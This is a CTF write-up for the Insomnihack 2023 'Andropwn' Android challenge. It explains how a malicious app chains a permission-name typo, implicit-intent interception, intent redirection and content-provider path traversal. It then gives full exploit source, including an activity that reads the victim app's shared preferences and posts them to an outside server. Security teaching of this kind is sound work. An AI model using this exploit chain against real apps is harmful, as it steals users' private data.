+++

date = "2023-03-27T04:05:25-06:00"
draft = false
title = "[EN] - Insomnihack 23 - Andropwn writeup"

+++

This challenge is a vulnerable android application. The attacker needs to exploit IPCs and Permissions issues to compromise the application and leak the flag.

### Description of the challenge

Our administrator saved a sensitive note in his <a href="/files/app.apk">note-taking application</a>. I convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.

System running: `system-images;android-30;google_apis_playstore;x86_64`

### Solution

When we run the application in an Android Emulator, we can quickly see that the application is a basic Note application. A user can add and edit notes `¯\_(ツ)_/¯`.

<p align="center">
  <img src="/img/blog-andropwn-1/noteapp.png" />
</p>

The reverse engineering of the application gives us some additional information:

A permission is defined with a protectionLevel assigned with `signature`.

```xml
<permission android:name="com.inso.APIRESTRICTION" android:protectionLevel="signature"/>
```

Three Activites are defined and exported but two of them are restricted with permissions.

```xml
<activity android:name="com.inso.mynotes.NoteAPI" android:permission="com.inso.APIRETSRICTION" android:exported="true"/>
<activity android:name="com.inso.mynotes.NoteEdition" android:permission="com.inso.APIRESTRICTION" android:exported="true"/>
<activity android:name="com.inso.mynotes.MainActivity" android:exported="true">
```

However, due to a typography issue in the permission name of the `.NoteAPI` activity, it is possible to access it without the signature requirement.

In the `.MainActivity` we can see that the notes are stored in a sharedpreference file with a random filename.

```java
 String string = sharedPreferences.getString("spname", null);
        if (string != null) {
            f2223x = string;
        } else {
            StringBuilder g3 = androidx.activity.result.a.g("mynotes_");
            g3.append(UUID.randomUUID().toString());
            f2223x = g3.toString();
            sharedPreferences.edit().putString("spname", f2223x).apply();
        }
        ListView listView = (ListView) findViewById(R.id.ListView);
        SharedPreferences sharedPreferences2 = getApplicationContext().getSharedPreferences(f2223x, 0);
        HashSet hashSet = (HashSet) sharedPreferences2.getStringSet("notes", null);
```

In the `.NoteAPI` we can see that the app can retrieve two extras.

```java
  if (intent.hasExtra("debug")) {
    f2.a aVar = new f2.a();
    aVar.c = MainActivity.v.size();
    aVar.f2488d = v;
    aVar.f2489e = getApplicationContext().getPackageName();
    startActivity(new Intent("COM_INSO_DEBUG_API").putExtra("debug", aVar));
  }
  if (intent.hasExtra("nxt")) {
    startActivity((Intent) getIntent().getParcelableExtra("nxt"));
  }
```

- When the `debug` extra is specified the application starts an Implicit Intent and pass a Parcelable (serialized object) extra which embeds the name of the sharedPreference file, the number of notes and the package name.

- When the `nxt` parameter is specified the application starts the intent object specified in the `nxt` Parcelable extra.

Finally, one custom content provider is defined but not exported. This content provider returns the content from a file located on the external storage. The name of the file is provided using the uri parameter and filtered using the `uri.getLastPathSegment()` method.

```xml
<provider android:name="com.inso.ContentProvider" android:exported="false" android:authorities="com.inso.provider" android:grantUriPermissions="true"/>
```

```java
    @Override // android.content.ContentProvider
    public final ParcelFileDescriptor openFile(Uri uri, String str) {
        return ParcelFileDescriptor.open(new File(Environment.getExternalStorageDirectory(), uri.getLastPathSegment()), 805306368);
    }
```

### Exploit

The idea of the attack is to find a way to leak the filename of the sharedpreference and to retrieve its content using the content provider.

The attacker needs to chain 4 vulnerabilities to perform the exploit.

- The typography in the Permission can be abused to call the NoteAPI component.  
- Using the `debug` extra the attacker can leak the filename of the sharedpreference using an implicit intent interception.  
- Then using the `nxt` extra the attacker can access any protected component and target the content provider to leak the content of a file with a grant URI flag. The attacker can leak the sharedpreference file as he knows the filename with the previous step.
- Finally, a path traversal issue can be performed in the `getLastPathSegment()` method to escape the restriction of the external storage location.

### Malicious application:

- AndroidManifest.xml
```xml
<permission android:name="com.inso.APIRETSRICTION"></permission>
    <uses-permission android:name="com.inso.APIRETSRICTION" />
    <uses-permission android:name="android.permission.INTERNET"/>

    <application
        android:allowBackup="true"
        ...
        android:usesCleartextTraffic="true"
        tools:targetApi="31">
        <activity
            android:name=".LeakActivity2"
            android:exported="true" />
        <activity
            android:name=".LeakActivity"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="COM_INSO_DEBUG_API" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

```

- MainActivity.java
```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent leakplease = new Intent();
        leakplease.setClassName("com.inso.mynotes","com.inso.mynotes.NoteAPI");
        leakplease.putExtra("debug","foo");
        startActivity(leakplease);
    }
}
```

> To be able to deserialize the parcelable extra, the malicious application must integrate the original object as defined in the malicious application `f2.a`.

- f2.a

```java
package f2;

import android.os.Parcel;
import android.os.Parcelable;

public class a implements Parcelable {
    public int c;
    public String d;
    public String e;
    public static final Parcelable.Creator<a> CREATOR;

    static {
        CREATOR = new Creator<a>() {
            @Override
            public a createFromParcel(Parcel in) {
                return new a(in);
            }

            @Override
            public a[] newArray(int i) {
                return new a[0];
            }
        };
    }
...

    public String getD() {
        return d;
    }

    @Override
    public void writeToParcel(Parcel parcel, int i) {
        parcel.writeInt(this.c);
        parcel.writeString(this.d);
        parcel.writeString(this.e);
    }

}
```
- LeakActivity.java

```java
import f2.a;

public class LeakActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leak);

        if(getIntent().hasExtra("debug")) {
            // LEAK
            a debg = getIntent().getParcelableExtra("debug");
            String fnname = debg.getD();
            Log.d("poc", "STEP 1: Leak random filename - " + debg.getD());

            // ACCESS CONTENT PROVIDER
            Intent nxt = new Intent();

            // PATH TRAVERSAL getLastPathSegment()
            nxt.setData(Uri.parse("content://com.inso.provider/..%2f..%2f..%2f..%2fdata%2fdata%2fcom.inso.mynotes%2fshared_prefs%2f" + debg.getD() + ".xml"));
            nxt.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            nxt.setClassName(getPackageName(), "com.inso.exploit2.LeakActivity2");

            Intent expl = new Intent();
            expl.setClassName("com.inso.mynotes","com.inso.mynotes.NoteAPI");
            expl.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
            expl.putExtra("nxt",nxt);
            startActivity(expl);
        }
    }
}
```
- LeakActivity2.java

```java
public class LeakActivity2 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leak2);
        try {
            InputStream i = getContentResolver().openInputStream(getIntent().getData());
            String result = convertInputStreamToString(i);
            Log.d("poc", "STEP 2:" + result);

            String url = "http://mysuperserver.ch/";
            OkHttpClient client = new OkHttpClient();
            RequestBody body = RequestBody.create(MediaType.parse("application/xml"),result);
            Request request = new Request.Builder().url(url).post(body).build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    e.printStackTrace();
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()){
                        Log.d("http","ok");
                    }
                }
            });

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static String convertInputStreamToString(InputStream is) throws IOException {
        ByteArrayOutputStream result = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int length;
        while ((length = is.read(buffer)) != -1) {
            result.write(buffer, 0, length);
        }
        return result.toString(String.valueOf(StandardCharsets.UTF_8));
    }
}
```